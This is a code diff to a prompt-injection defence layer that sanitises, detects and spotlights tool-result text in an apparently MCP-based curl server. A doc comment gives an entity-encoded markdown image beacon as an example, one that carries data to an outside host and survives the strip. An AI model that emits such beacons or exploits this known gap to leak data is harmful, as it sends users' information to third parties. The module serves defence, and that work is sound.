@@ -2,11 +2,12 @@
 // Defence-in-depth wrap for tool results (PR-6b / B3).
 //
 // `createWrapper(config)` returns a closure `wrap(result, hostname)` that runs
-// the three response-side defences (sanitise + detect + optional spotlight)
-// over each text content part of a `CallToolResult`. Server-scope config (the
-// spotlighting flag) is bound once at server creation; request-scope hostname
-// is passed per call so the per-host injection-detection throttle keys
-// correctly.
+// the full response-side defence — `defendForInline` (Steps 2-5, per JSON
+// value where the text is a JSON document), then optional
+// spotlighting — over each text content part of a `CallToolResult`.
+// Server-scope config (the spotlighting flag) is bound once at server
+// creation; request-scope hostname is passed per call so the per-host
+// injection-detection throttle keys correctly.
 //
 // Design notes:
 //
@@ -17,12 +18,13 @@
 //    short-circuit return path in `extensible/hook-executor.ts`. Symbol-tag
 //    idempotence (see point 3) lets these compose freely.
 //
-// 2. **Detect-on-original ordering (S4).** The wrap delegates the
-//    sanitise/detect step to `sanitizeAndDetect()` in
-//    `security/detection-logger.ts`, which now detects on the **original**
-//    text before sanitisation. Future PRs (B7/B8) will add stripping passes
-//    that erase the very byte sequences the detector looks for; running
-//    detection first preserves the log signal.
+// 2. **Detect-on-original ordering (S4).** The wrap delegates the whole
+//    pipeline to `defendText()` in `processor.ts`, whose Step 2 detects on
+//    the **original** text before sanitisation. That ordering is load-bearing
+//    here precisely because Steps 3-5 strip the byte sequences the detector
+//    looks for; running detection first preserves the log signal.
+//    `processTextPart` below states which options this boundary passes,
+//    and what each one costs.
 //
 // 3. **Idempotence via a module-private `Symbol("mcp-curl.wrapped")`.** A
 //    `CallToolResult` that has already passed through wrap carries a
@@ -54,9 +56,9 @@
 //    upstream cannot recycle a leaked UUID across responses.
 
 import { randomUUID } from "node:crypto";
-import { sanitizeAndDetect } from "../security/detection-logger.js";
 import { logWrapError } from "../security/wrap-error-logger.js";
 import { applySpotlighting } from "../utils/sanitize.js";
+import { defendForInline } from "./processor.js";
 
 // Module-private symbol — deliberately NOT `Symbol.for()`. The global symbol
 // registry is reachable from any code path that runs in this realm, including
@@ -76,8 +78,8 @@ const WRAPPED = Symbol("mcp-curl.wrapped");
  * Server-scope config bound once at wrapper creation.
  *
  * `enableSpotlighting` mirrors `McpCurlConfig.enableSpotlighting` — when
- * `true`, sanitised text parts are also wrapped in spotlighting sentinels;
- * when `false`/`undefined`, sanitise + detect still run.
+ * `true`, defended text parts are also wrapped in spotlighting sentinels;
+ * when `false`/`undefined`, the defence pipeline still runs.
  */
 export interface WrapperConfig {
     enableSpotlighting?: boolean;
@@ -166,10 +168,13 @@ export function isWrappedResult(result: unknown): boolean {
  * or Proxy-blocked). Defence-in-depth must never propagate exceptions to the
  * handler boundary, so we swallow the defineProperty failure here. The
  * trade-off: a downstream wrap on the same frozen result will re-run the
- * pipeline. That is semantically harmless because `sanitizeResponse` is
- * idempotent on already-sanitised text and `applySpotlighting` short-circuits
- * on already-wrapped envelopes — the worst case is one extra O(n) pass over
- * the body, never a correctness issue.
+ * pipeline. That is semantically harmless: `defendForInline` is idempotent on
+ * this boundary's options — the entity decode is off, every remaining stage
+ * rewrites to a form it no longer matches, and the JSON arm's serialisation is
+ * a fixed point because a second pass measures the first pass's own output and
+ * makes the same indent choice — and `applySpotlighting` short-circuits on
+ * already-wrapped envelopes. The worst case is one extra linear pass over the
+ * body, never a correctness issue.
  *
  * The own-tag probe is also routed through `hasOwnWrappedTag` so a hostile
  * Proxy whose `getOwnPropertyDescriptor` / `get` trap throws cannot break
@@ -194,6 +199,36 @@ function tag<T extends object>(result: T): T {
     return result;
 }
 
+/**
+ * Defend one text part.
+ *
+ * Passes `contentTypeUndetermined: true` because at this
+ * boundary the content type genuinely is undetermined: a `registerCustomTool()`
+ * handler return, a `beforeRequest` short-circuit and a YAML endpoint result
+ * arrive as bare text with no declared grammar. `defendText` reads that as the
+ * strictest grammar, so every strip stage runs.
+ *
+ * `excludeJsonDocuments: false` because the exemption's whole justification is
+ * about a persisted artefact — `processResponse` writes post-strip content to
+ * disk and `jq_query` reads it back — and nothing on this boundary writes to
+ * disk. A custom tool's return goes straight to the model, which renders the
+ * text, so a beacon inside a JSON string value fires exactly as it would
+ * outside one. `LESSONS.md` RC-10.
+ *
+ * `decodeEntities: false` for the same reason the header channel passes it
+ * (`LESSONS.md` RC-3): the decode's output is what gets RETURNED, so on a
+ * channel whose consumer does not itself decode, it manufactures live markup
+ * from inert bytes the tool meant literally.
+ *
+ * **What that costs here is larger than on the header channel, and it is not
+ * only a logging blindness.** An entity-encoded beacon —
+ * `![x](&#104;ttps://host/?d=…)` — SURVIVES THE STRIP and is returned intact,
+ * and an MCP client that renders this text as markdown decodes entity
+ * references in link destinations. The two channels want opposite things from
+ * one stage and no per-caller flag setting is right for both: `LESSONS.md`
+ * RC-12, open design question in `docs/todos/004`, cost restated in
+ * ARCHITECTURE.md invariant 1a.
+ */
 function processTextPart(
     part: unknown,
     hostname: string,
@@ -202,7 +237,7 @@ function processTextPart(
     // Defensive: a single null/undefined or non-object content entry must
     // not throw out of `.map()` and abort the wrap for the entire result.
     // Non-text parts (and malformed entries) pass through unchanged so the
-    // valid text parts still get sanitise + detect + spotlight.
+    // valid text parts still get the full defence + spotlight.
     if (part === null || typeof part !== "object") return part;
     const contentPart = part as WrappableContentPart;
 
@@ -224,8 +259,8 @@ function processTextPart(
     }
     if (type !== "text" || typeof text !== "string") return part;
 
-    const sanitised = sanitizeAndDetect(text, hostname);
-    const finalText = requestId ? applySpotlighting(sanitised, requestId) : sanitised;
+    const defended = defendForInline(text, hostname);
+    const finalText = requestId ? applySpotlighting(defended, requestId) : defended;
     // Spread reads every own enumerable property, also routed through Proxy
     // `get` / `ownKeys` traps. Contain the same way — a throwing trap on a
     // sibling property must not lose sanitisation for the rest of the array.
